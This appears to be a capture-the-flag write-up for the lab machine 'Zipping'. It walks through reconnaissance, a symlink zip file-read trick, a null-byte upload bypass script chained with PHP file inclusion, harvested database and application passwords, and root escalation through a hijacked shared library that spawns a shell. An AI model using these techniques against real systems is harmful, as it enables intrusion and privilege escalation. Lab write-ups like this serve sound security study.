# Zipping

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:27 CEST
Nmap scan report for 10.10.11.229
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

# Gobuster

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.229
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/freckles/Documents/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/27 19:38:20 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.229/assets/]
/index.php            (Status: 200) [Size: 16738]
/server-status        (Status: 403) [Size: 277]
/shop                 (Status: 301) [Size: 311] [--> http://10.10.11.229/shop/]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.11.229/uploads/]
Progress: 4386 / 4724 (92.85%)
===============================================================
2023/09/27 19:38:27 Finished
===============================================================
```

# Interesting things

- Contact us input form on the main page
    - No events or requests tied to this
- `http://10.10.11.229/upload.php` Can be accessed from the _work with us_ page.
  Allows for uploading zipfiles
- `/shop` shopping page

# Upload box

Testing what is and isn't possible in the upload box
- Blank pdf results in an asset being created on the server in
  `/uploads/123...456/the_pdf_name.pdf`
- Uploading php code in the pdf results in the php code being returned as text
- Uploading a folder with a pdf and php code results in an error
- Uploading `php-script.pdf.php` results in an error
- Zipslipping throws the same "only one file error"
- Using `php_info.php#.pdf` results in a valid upload :scream:

> Interesting note, the store has an `?page=products` url. Maybe it is possible
> to upload a file that can be referenced via the store???

- Using `/shop/index.php?page=products` returns the products page. So does
  `/shop/index.php?page=../shop/products`
    - `/shop/index.php?page=../upload` returns the `upload.php` page
    - It looks like the `?page` param looks for a file with an `.php` extension
      in the folder
- Other interesting note, the uploaded file path is always the md5 of the file

# Symlink zipslipping

This seems to work. Creating a zipfile from a symlink allows us to read
arbitrary files on the box:

```bash
sudo ln -s ../../../../../../../../etc/passwd zipslip_etc_pass.pdf

sudo zip --symlink zipslip_etc_pass.zip zipslip_etc_pass.pdf

wget {the upload path} # returns the /etc/passwd file
```

From this we get the user account _rektsu_.

# Reading the php code

### Quick analysis of upload.php

- md5 hash the zipfile (we already guessed this)
- get temp dir of system (`sys_get_temp_dir()`)
- If zipfile contains one file ending in PDF continue
    - PDF check is done with `pathinfo`
- execute system command `7z e {zipfile} -o /tmp/uploads/{md5}`
- If exists `/tmp/uploads/{md5}/{file from zip}`
    - Rename `/tmp/uploads/{md5}/{file from zip}` to `uploads/{md5}/{file from
      zip}`

> Notes, why use 7z system command? We can probably inject something in this
> command with the filename of the zipfile

# Null bytes

We can create a special zipfile with a null byte in the filename. So the
filename will be something like `upload.php\0.pdf`. This will pass the name
check because it ends in `.pdf` but the uploaded file will be called
`upload.php`. 

An importing thing to note is that the php script checks for the file before
moving so it won't be available in the `/uploads` directory but in the `tmp`
directory.

The code used for the exploit

```bash
#!/bin/bash

# Settings
file=special_phpinfo.zip
uri=10.10.11.229


md5=($( md5sum $file ))
echo $md5

echo "Uploading the payload"
http -q -f POST $uri/upload.php \
  zipFile@$file \
  submit=''

echo "Calling the payload"
http $uri/shop/index.php?page=/tmp/uploads/$md5/a > outfile
```

# Mysql
From the `functions.php` file we can extract the database info:
```
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';

```

Nothing interesting, just the list of products and nothing more. Seem mysql is
also running as the default user and not root.

# Linpeas

```
Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Oct  7  2022 /etc/skel/.bashrc
-r--r--r-- 1 rektsu rektsu 3780 Apr  1 02:13 /home/rektsu/.bashrc

-rw-r--r-- 1 root root 807 Oct  7  2022 /etc/skel/.profile
-rw-r--r-- 1 rektsu rektsu 810 Feb  4  2023 /home/rektsu/.profile

drwx------ 3 rektsu rektsu 4096 Sep 29 21:30 /home/rekts



User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock

```

# /usr/bin/stock

This seems like the way for PE. A file we can run as root that manages the stock
of the site itself (looks like it). Should decompile this for more info.

> From the output i could determine the password `St0ckM4nager`

Adding a `'` in the command flips it out.

## Ghidra

Ghidra shows us an `dlopen` call is done after logging in, `dlopen` is used to
open dynamically linked libraries. We can use `strace` to log all the calls so
we don't have to debug in GDB.

The relevant part
```
newfstatat(0, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, St0ckM4nager
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
write(1, "\n================== Menu ======="..., 44
```

It seems a `libcounter.so` is loaded from the config directory of the user. This
file does not exists so we can replace it with our own, and because it runs as
root we get root privileges. Creating the payload:

```
#include <stdio.h>
#include <stdlib.h>

// Load this on startup
__attribute__((constructor))
void setup() {
  system("/bin/bash");
}
```

Running the programming and providing the `St0ckM4nager` password so we get to
the loaded library part and now we have a bash shell ready in the background.
Exiting the program greets us with root

```
rektsu@zipping:/tmp/uploads/pe$ sudo /usr/bin/stock
Enter the password: St0ckM4nager
root@zipping:/tmp/uploads/pe# whoami
root
```
